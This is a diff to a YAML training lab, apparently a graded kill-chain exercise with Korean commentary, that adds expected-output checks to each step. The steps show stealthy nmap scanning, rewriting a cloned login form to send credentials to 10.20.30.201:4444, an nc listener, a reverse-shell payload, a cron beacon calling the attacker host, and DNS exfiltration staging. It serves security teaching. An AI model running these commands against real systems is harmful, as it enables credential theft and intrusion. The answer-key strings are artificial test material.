@@ -25,7 +25,7 @@ steps:
     T2(polite) 타이밍은 패킷 전송 간격을 늘려 IDS/IPS의 임계값 기반 탐지를 회피한다. APT 정찰 단계에서 가장 기본적인 기법이다.
   verify:
     type: output_contains
-    expect: null
+    expect: 10.20.30.
     field: stdout
   target_vm: attacker
   script: nmap -sS -T2 --max-retries 1 --host-timeout 15s 10.20.30.0/24
@@ -43,7 +43,7 @@ steps:
     핵심 과정이다.
   verify:
     type: output_contains
-    expect: null
+    expect: open
     field: stdout
   target_vm: attacker
   script: nmap -sV -O -sC --max-retries 1 --host-timeout 15s -T4 10.20.30.80
@@ -60,7 +60,7 @@ steps:
     http-vuln-*, ssl-heartbleed 등이 자동 실행되며, 이는 킬체인의 정찰→무기화 전환 단계에서 공격 벡터를 선정하는 데 활용된다.
   verify:
     type: output_contains
-    expect: null
+    expect: vuln
     field: stdout
   target_vm: attacker
   script: nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80
@@ -79,7 +79,7 @@ steps:
     사회공학 공격의 성공률이 높아진다. HTML을 수정하여 자격증명을 공격자 서버로 전송하도록 변조한다.
   verify:
     type: output_contains
-    expect: null
+    expect: phish_template.html
     field: stdout
   target_vm: attacker
   script: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/ && ls -la /tmp/phish_template.html
@@ -101,7 +101,7 @@ steps:
     이를 더 정교하게 처리하여 원본 사이트로 리다이렉트하여 피해자가 인지하지 못하게 한다. 이는 킬체인의 전달(Delivery) 단계에 해당한다.
   verify:
     type: output_contains
-    expect: ''
+    expect: 10.20.30.201:4444
     field: stdout
   target_vm: attacker
   script: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
@@ -124,7 +124,7 @@ steps:
     동일하다. 포트 4444는 실습용이며 실제로는 80, 443 등 일반 포트를 사용한다.
   verify:
     type: output_contains
-    expect: ''
+    expect: listening
     field: stdout
   target_vm: attacker
   script: nc -lvnp 4444 &>/tmp/nc_listener.log & sleep 1 && echo "netcat listening
@@ -146,7 +146,7 @@ steps:
     기법이다.
   verify:
     type: output_contains
-    expect: null
+    expect: payload.elf
     field: stdout
   target_vm: attacker
   script: printf "#!/bin/bash\n# Reverse Shell Payload (simulation)\n# LHOST=10.20.30.201
@@ -169,7 +169,7 @@ steps:
     커스텀 암호화로 탐지를 회피한다.
   verify:
     type: output_contains
-    expect: null
+    expect: /bin/bash
     field: stdout
   target_vm: attacker
   script: sha256sum /tmp/payload.elf && echo "--- Strings analysis ---" && strings
@@ -190,7 +190,7 @@ steps:
     서비스, init.d 스크립트, 커널 모듈 등 더 은밀한 방법을 사용한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: beacon
     field: stdout
   target_vm: attacker
   script: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon')
@@ -209,7 +209,7 @@ steps:
     SIEM에서 cron 관련 syslog를 수집하여 이상 패턴을 탐지할 수 있다. 이는 킬체인 분석에서 양측 관점을 이해하는 데 중요하다.
   verify:
     type: output_contains
-    expect: null
+    expect: beacon
     field: stdout
   target_vm: attacker
   script: crontab -l && grep -i cron /var/log/syslog | tail -20
@@ -229,7 +229,7 @@ steps:
     Shell)에 해당하며, 메모리 포렌식으로만 탐지 가능한 경우가 많다.
   verify:
     type: output_contains
-    expect: null
+    expect: whoami
     field: stdout
   target_vm: attacker
   script: export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD
@@ -247,7 +247,7 @@ steps:
     숨겨진 경로, JavaScript 내 API 엔드포인트 등을 분석할 수 있다. 실제 공격에서는 대역폭과 로그를 고려하여 선택적으로 다운로드한다.
   verify:
     type: output_contains
-    expect: null
+    expect: saved
     field: stdout
   target_vm: attacker
   script: wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5
@@ -267,7 +267,7 @@ steps:
     허용하는 점을 악용하여 데이터를 Base64 인코딩 후 DNS 서브도메인으로 전송한다.
   verify:
     type: output_contains
-    expect: null
+    expect: exfil
     field: stdout
   target_vm: attacker
   script: cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt
@@ -292,7 +292,7 @@ steps:
     킬체인 각 단계에서 사용한 기법과 MITRE ATT&CK ID를 문서화하여 방어 전략 수립에 활용한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Kill Chain Report
     field: stdout
   target_vm: attacker
   script: 'crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt
